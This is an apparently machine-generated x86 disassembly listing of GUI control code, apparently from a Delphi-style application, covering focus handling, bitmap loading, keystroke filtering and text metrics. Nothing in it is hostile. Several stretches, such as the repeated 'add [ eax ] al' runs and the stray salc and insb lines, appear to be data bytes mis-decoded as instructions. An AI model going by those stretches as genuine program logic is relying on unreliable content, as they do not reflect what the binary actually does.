add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0xc ] cl
in al 0x44
add al cl
hlt
sub_46f47a
inc esp
add [ eax - 0x2a ] ah
inc esp
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 + 0x2200044 ] dh
inc edi
add [ edx ] al
add ch dl
call ebx
push esp
add [ edi ] al
insb
add [ edi ] eax
adc [ esp + edx * 2 + 0x69 ] edx
insd
jb r-xdata
shl [ ebx ] 0x1
inc esi
push eax
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43c850
call sub_43c930
jo r-xdata
mov eax esi
call sub_46f598
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
aam 0xfc
inc [ eax + eax * 8 - 0x6b5ef28c ]
cmc
inc esi
add bh dh
shl [ ebx ] 0x1
inc esi
push eax
inc edx
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
je r-xdata
outsb
mov ah 0xf4
inc esi
add [ edi ] al
adc [ esp + edx * 2 + 0x69 ] edx
insd
jb r-xdata
test al al
je r-xdata
jo r-xdata
jo r-xdata
inc edx
jne r-xdata
mov [ esi + 0x208 ] eax
mov eax esi
call sub_46f598
add [ eax ] al
xor edx edx
mov eax esi
call sub_46fa40
mov edx 0x14
mov eax esi
call sub_44c948
mov edx 0x19
mov eax esi
call sub_44c96c
mov eax [ esi + 0x208 ]
mov [ esi + 0x210 ] eax
mov eax esi
test bl bl
je r-xdata
add al [ eax ]
add [ ebx ] dh
ror [ ebx + 0x480e8c6 ] cl
add [ eax ] al
je r-xdata
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_46f9c4
outsb
add ah dh
inc esi
add [ eax ] al
sbb [ ebx ] al
daa
add [ ebx + edx * 2 ] al
jo r-xdata
outsb
add [ eax ] al
sub_46f4d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f7b4
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
call sub_46f598
mov [ esi + 0x208 ] eax
mov eax esi
call sub_46f598
mov [ esi + 0x20c ] eax
xor edx edx
mov eax esi
call sub_46f9c4
xor edx edx
mov eax esi
call sub_46fa40
mov edx 0x14
mov eax esi
call sub_44c948
mov edx 0x19
mov eax esi
call sub_44c96c
mov eax [ esi + 0x208 ]
mov [ esi + 0x210 ] eax
mov eax esi
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_46f598
push ebx
push esi
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_432e44
mov ebx eax
mov [ ebx + 0x124 ] esi
mov [ ebx + 0x120 ] sub_46f898
mov [ ebx + 0xd4 ] esi
mov [ ebx + 0xd0 ] sub_46f7fc
mov dl 0x1
mov eax ebx
call sub_44d0ac
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov al [ r-xdata ]
mov [ ebx + 0x18c ] al
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax ebx
pop esi
pop ebx
retn
sub_46f5f9
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44c65c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x214 ]
jne r-xdata
xor eax eax
mov [ edi + 0x214 ] eax
sub_46f62c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ebp [ ebx + 0x208 ]
test ebp ebp
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp [ esi ] 0xf
jge r-xdata
mov eax [ esi ]
push eax
mov eax [ edi ]
sar eax 0x1
jns r-xdata
mov [ esi ] 0xf
push eax
xor ecx ecx
xor edx edx
mov eax ebp
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax [ esi ]
push eax
mov eax [ edi ]
mov edx [ ebx + 0x208 ]
mov ebp [ edx + 0x4c ]
sub eax ebp
inc eax
push eax
mov ecx ebp
dec ecx
xor edx edx
mov eax [ ebx + 0x20c ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
adc eax 0x0
sub_46f698
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46f62c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_453474
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46f6dc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452074
mov eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_46f62c
mov eax [ esp ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
call sub_453474
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
xor eax eax
mov [ esi + 0xc ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_46f73c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x210 ]
mov al [ esi + 0x18c ]
or al [ r-xdata ]
mov [ esi + 0x18c ] al
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
sub_46f765
add [ eax ] al
add [ ebx + 0x56 ] dl
mov ebx eax
mov esi [ ebx + 0x210 ]
mov al [ r-xdata ]
not eax
and al [ esi + 0x18c ]
mov [ esi + 0x18c ] al
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ebx
retn
sub_46f797
mov ax [ edx ]
sub ax 0x20
je r-xdata
mov eax [ esi + 0x210 ]
mov si 0xffeb
call sub_40338c
sub ax 0x6
je r-xdata
mov edx [ esi + 0x208 ]
mov eax esi
call sub_46f8dc
mov eax [ esi + 0x208 ]
mov si 0xffeb
call sub_40338c
pop esi
retn
sub ax 0x2
je r-xdata
mov edx [ esi + 0x20c ]
mov eax esi
call sub_46f8dc
mov eax [ esi + 0x20c ]
mov si 0xffeb
call sub_40338c
pop esi
retn
jmp r-xdata
pop esi
retn
sub_46f7fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
test cl cl
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax edi
call sub_46f8dc
mov ebx [ edi + 0x214 ]
test ebx ebx
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebx + 0x1a4 ] 0x0
je r-xdata
mov eax edi
call sub_453a88
mov ebx eax
call GetFocus
cmp ebx eax
je r-xdata
mov eax ebx
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
mov eax edi
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
mov eax [ edi + 0x214 ]
call sub_453a88
mov ebx eax
call GetFocus
cmp ebx eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax [ edi + 0x214 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
jmp r-xdata
sub_46f898
push ebx
cmp edx [ eax + 0x208 ]
jne r-xdata
cmp [ eax + 0x222 ] 0x0
je r-xdata
cmp [ eax + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
mov ebx eax
mov edx eax
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
pop ebx
retn
sub_46f8dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ ebx + 0x1a4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
cmp edi [ ebx + 0x210 ]
je r-xdata
mov esi [ ebx + 0x210 ]
mov al [ r-xdata ]
not eax
and al [ esi + 0x18c ]
mov [ esi + 0x18c ] al
mov [ ebx + 0x210 ] edi
mov eax ebx
call sub_453a88
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov esi [ ebx + 0x210 ]
mov al [ esi + 0x18c ]
or al [ r-xdata ]
mov [ esi + 0x18c ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46f959
add [ eax ] al
add bh al
inc edx
or al 0x1
add [ eax ] al
add bl al
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_44f248
mov eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_46f62c
mov eax [ esp ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
call sub_453474
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop ecx
pop edx
pop ebx
retn
sub_46f9c4
push esi
mov esi eax
test edx edx
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call LoadBitmapA
push eax
mov eax [ esi + 0x208 ]
call sub_433618
pop edx
call sub_4296c0
mov dl 0x1
mov eax [ esi + 0x208 ]
call sub_433648
mov eax [ esi + 0x208 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
mov eax [ esi + 0x208 ]
call sub_433624
pop esi
retn
sub_46fa40
push esi
mov esi eax
test edx edx
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call LoadBitmapA
push eax
mov eax [ esi + 0x20c ]
call sub_433618
pop edx
call sub_4296c0
mov dl 0x1
mov eax [ esi + 0x208 ]
call sub_433648
mov eax [ esi + 0x20c ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
mov eax [ esi + 0x20c ]
call sub_433624
pop esi
retn
sub_46fab4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4419f0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f4d8
mov esi eax
mov [ ebx + 0x22c ] esi
mov eax esi
mov edx 0xf
call sub_44c948
mov eax [ ebx + 0x22c ]
mov edx 0x11
call sub_44c96c
mov eax [ ebx + 0x22c ]
mov dl 0x1
call sub_44d0ac
mov eax [ ebx + 0x22c ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x22c ]
mov [ eax + 0x214 ] ebx
mov [ eax + 0x21c ] ebx
mov edx [ ebx ]
mov edx [ edx + 0xec ]
mov [ eax + 0x218 ] edx
mov [ eax + 0x224 ] ebx
mov edx [ ebx ]
mov edx [ edx + 0xf0 ]
mov [ eax + 0x220 ] edx
mov edx r-xdata
mov eax ebx
call sub_44d1bc
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x228 ] 0x1
mov [ ebx + 0x230 ] 0x1
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_46fbb8
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x22c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_46fbf0
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ esi ] 0x26
jne r-xdata
cmp [ esi ] 0x28
jne r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xec ]
jmp r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4528b4
pop edx
pop esi
pop ebx
retn
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf0 ]
sub_46fc30
push ebx
push esi
mov ebx edx
mov esi eax
mov dl [ ebx ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov [ ebx ] 0x0
push 0x0
call MessageBeep
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_452a6c
sub_46fc64
push ebx
push esi
push edi
add esp 0xffffffe0
mov ebx edx
mov esi eax
push esi
mov esi r-xdata
lea edi [ esp + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov eax [ rw-data ]
mov al [ eax ]
and eax 0xff
bts [ esp ] eax
mov eax ebx
and eax 0xff
bt [ esp ] eax
jb r-xdata
mov al 0x1
cmp bl 0x20
jae r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
cmp bl 0x20
jae r-xdata
xor eax eax
jmp r-xdata
cmp bl 0xd
jne r-xdata
xor eax eax
cmp bl 0x8
je r-xdata
mov dl [ esi + 0x230 ]
xor dl 0x1
test dl al
je r-xdata
cmp bl 0x2e
jne r-xdata
sub_46fcd2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
inc [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx edx
mov edx ebx
call sub_441ef4
mov eax [ ebx + 0x4 ]
or eax 0x4
or eax 0x2000000
mov [ ebx + 0x4 ] eax
pop ebx
retn
sub_46fd24
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax esp
push eax
push 0x0
push 0xb2
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax ebx
call sub_44cbd4
inc eax
mov [ esp + 0xc ] eax
mov eax ebx
call sub_44cb90
mov edx [ ebx + 0x22c ]
sub eax [ edx + 0x48 ]
sub eax 0x2
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp ] eax
mov eax esp
push eax
push 0x0
push 0xb4
mov eax ebx
call sub_453a88
push eax
call SendMessageA
mov eax esp
push eax
push 0x0
push 0xb2
mov eax ebx
call sub_453a88
push eax
call SendMessageA
add esp 0x10
pop ebx
retn
sub_46fda4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_452074
mov eax esi
call sub_46fe44
cmp eax [ esi + 0x4c ]
jle r-xdata
cmp [ esi + 0x22c ] 0x0
je r-xdata
mov edx eax
mov eax esi
call sub_44c96c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx [ esi + 0x22c ]
mov edi [ edx + 0x48 ]
push edi
mov edx [ esi + 0x4c ]
sub edx 0x3
push edx
mov eax [ esi + 0x22c ]
mov edx [ esi + 0x48 ]
sub edx edi
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
mov edx [ esi + 0x22c ]
mov edi [ edx + 0x48 ]
push edi
mov edx [ esi + 0x4c ]
sub edx 0x5
push edx
mov eax [ esi + 0x22c ]
mov edx [ esi + 0x48 ]
sub edx edi
sub edx 0x5
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
mov eax esi
call sub_46fd24
sub_46fe44
push ebx
push esi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_423a54
push eax
push ebx
call SelectObject
mov esi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push esi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov ebx [ esp ]
mov esi [ esp + 0x38 ]
cmp ebx esi
jle r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx esi
sar ebx 0x2
add ebx esi
add eax ebx
add eax 0x2
add esp 0x70
pop esi
pop ebx
retn
add ebx 0x3
sub_46feb4
push ebx
mov ebx eax
cmp [ ebx + 0x20e ] 0x0
je r-xdata
mov eax ebx
call sub_46ff90
mov edx eax
add edx [ ebx + 0x228 ]
mov eax ebx
call sub_470018
pop ebx
retn
push 0x0
call MessageBeep
pop ebx
retn
sub_46fee4
push ebx
mov ebx eax
cmp [ ebx + 0x20e ] 0x0
je r-xdata
mov eax ebx
call sub_46ff90
mov edx eax
sub edx [ ebx + 0x228 ]
mov eax ebx
call sub_470018
pop ebx
retn
push 0x0
call MessageBeep
pop ebx
retn
sub_46ff54
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_452eb0
mov eax ebx
call sub_46ff90
mov edx eax
mov eax ebx
call sub_470070
mov esi eax
mov eax ebx
call sub_46ff90
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46ff90
mov edx eax
mov eax ebx
call sub_470018
sub_46ff90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_470005
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_46ffdc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44d18c
mov eax [ ebp - 0x8 ]
call sub_408190
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47000c
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
sub_470018
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_470062
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_470070
lea edx [ ebp - 0x4 ]
call sub_408054
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d1bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470069
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_470070
push esi
push edi
mov ecx edx
mov esi [ eax + 0x220 ]
mov edi [ eax + 0x224 ]
cmp esi edi
je r-xdata
mov eax ecx
pop edi
pop esi
retn
cmp esi edx
jle r-xdata
cmp edi edx
jge r-xdata
mov ecx esi
jmp r-xdata
mov ecx edi
sub_470098
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4422dc
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
mov eax ebx
call sub_441da0
sub_4700c0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x188 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_432f04
test bl bl
jle r-xdata
call sub_403190
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4700f4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_433404
test [ ebx + 0x18c ] 0x2
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ ebx + 0x188 ] 0x0
jne r-xdata
push ebx
push sub_4701a0
mov eax [ ebx + 0x188 ]
call sub_42fb28
mov edx 0x190
mov eax [ ebx + 0x188 ]
call sub_42fb18
mov dl 0x1
mov eax [ ebx + 0x188 ]
call sub_42fb08
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f980
mov [ ebx + 0x188 ] eax
sub_47016c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_4334fc
mov eax [ ebx + 0x188 ]
test eax eax
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
xor edx edx
call sub_42fb08
sub_4701a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x188 ]
mov edx 0x64
call sub_42fb18
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x182 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44d3b4
test al al
je r-xdata
xor eax eax
push ebp
push sub_4701f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_470220
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_432f3c
test [ ebx + 0x18c ] 0x1
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_416e5c
push 0xfffffffd
push 0xfffffffd
lea eax [ esp + 0x8 ]
push eax
call InflateRect
cmp [ ebx + 0x182 ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x160 ]
call sub_424a0c
push eax
call DrawFocusRect
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
sub_470288
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4702ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4702b4
retn
sub_4702e4
push ebx
push esi
push edi
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x0
mov eax esi
call sub_4041e0
cmp edi eax
jg r-xdata
mov eax esi
call sub_4041e0
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
mov [ esp ] al
mov edx edi
mov eax esi
call sub_40c218
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp edi 0x1
jle r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
cmp al [ rw-data ]
jne r-xdata
cmp [ esi + edi - 0x2 ] 0x5c
jne r-xdata
mov eax esi
call sub_4041e0
cmp eax 0x4
jl r-xdata
mov eax esi
call sub_4041e0
cmp eax 0x4
jl r-xdata
mov edx edi
dec edx
mov eax esi
call sub_40c218
test al al
jne r-xdata
mov al [ esp ]
sub al 0x2f
je r-xdata
mov eax esi
call sub_4041e0
sub eax 0x4
cmp edi eax
jle r-xdata
mov eax esi
call sub_4041e0
sub eax 0x4
cmp edi eax
jle r-xdata
cmp edi 0x2
jle r-xdata
mov bl 0x2
jmp r-xdata
sub al 0xb
jne r-xdata
mov al [ esi + edi - 0x2 ]
cmp al [ rw-data ]
jne r-xdata
mov bl 0x6
jmp r-xdata
mov bl 0x1
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
mov al [ esp ]
sub al 0x21
je r-xdata
cmp edi 0x2
jle r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c218
test al al
je r-xdata
mov bl 0x3
jmp r-xdata
sub al 0x1b
je r-xdata
mov bl 0x7
jmp r-xdata
cmp [ esi + edi - 0x3 ] 0x5c
jne r-xdata
sub al 0x2
je r-xdata
mov edx edi
sub edx 0x2
mov eax esi
call sub_40c218
cmp al 0x2
jne r-xdata
sub al 0x1e
jne r-xdata
mov al [ esp ]
sub al 0x23
je r-xdata
mov bl 0x5
jmp r-xdata
sub al 0x16
je r-xdata
sub al 0x28
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
mov al [ esp ]
sub al 0x30
je r-xdata
mov bl 0x4
sub al 0x11
je r-xdata
sub al 0x2
je r-xdata
sub al 0x9
jne r-xdata
sub_470438
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov bl [ r-xdata ]
mov eax edi
call sub_4041e0
mov esi eax
test esi esi
jle r-xdata
mov edx [ esp ]
mov eax edi
call sub_4702e4
cmp al 0x1
jne r-xdata
mov ebp 0x1
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or bl 0x8
cmp al 0x3e
jne r-xdata
or bl 0x1
jmp r-xdata
cmp al 0x3c
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
inc ebp
dec esi
jne r-xdata
cmp ebp [ esp ]
jge r-xdata
and bl 0xfb
cmp ebp 0x1
jle r-xdata
mov al [ edi + ebp - 0x1 ]
cmp al 0x21
jne r-xdata
and bl 0xfd
or bl 0x4
or bl 0x2
jmp r-xdata
cmp [ edi + ebp - 0x2 ] 0x3c
je r-xdata
sub_4704b4
mov edx eax
sub al 0x2f
je r-xdata
mov edx [ rw-data ]
mov dl [ edx ]
sub al 0xb
jne r-xdata
mov eax edx
retn
mov edx [ rw-data ]
mov dl [ edx ]
mov eax edx
retn
sub_4704d4
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4706de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx esi
call sub_403f74
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_470438
mov [ ebp - 0x11 ] al
test [ ebp - 0x11 ] 0x1
jne r-xdata
mov eax [ ebx ]
call sub_4041e0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4041e0
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4041e0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4706e5
lea eax [ ebp - 0x38 ]
mov edx 0x8
call sub_403f44
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x18 ] eax
mov esi 0x1
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx ]
mov ecx [ ebp - 0x10 ]
mov edx 0x1
call sub_404440
push [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_4704b4
mov edx eax
lea eax [ ebp - 0x30 ]
call sub_404108
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebx ]
call sub_4041e0
mov ecx eax
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
inc edx
mov eax [ ebx ]
call sub_404440
push [ ebp - 0x34 ]
mov eax ebx
mov edx 0x3
call sub_4042a0
jmp r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404440
push [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
call sub_4704b4
mov edx eax
lea eax [ ebp - 0x20 ]
call sub_404108
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
call sub_4041e0
mov ecx eax
sub ecx [ ebp - 0x10 ]
inc ecx
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
call sub_404440
push [ ebp - 0x24 ]
mov eax ebx
mov edx 0x3
call sub_4042a0
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebx ]
call sub_4041e0
cmp eax [ ebp - 0x10 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_4041e0
mov esi eax
sub esi [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4702e4
mov edx eax
dec edx
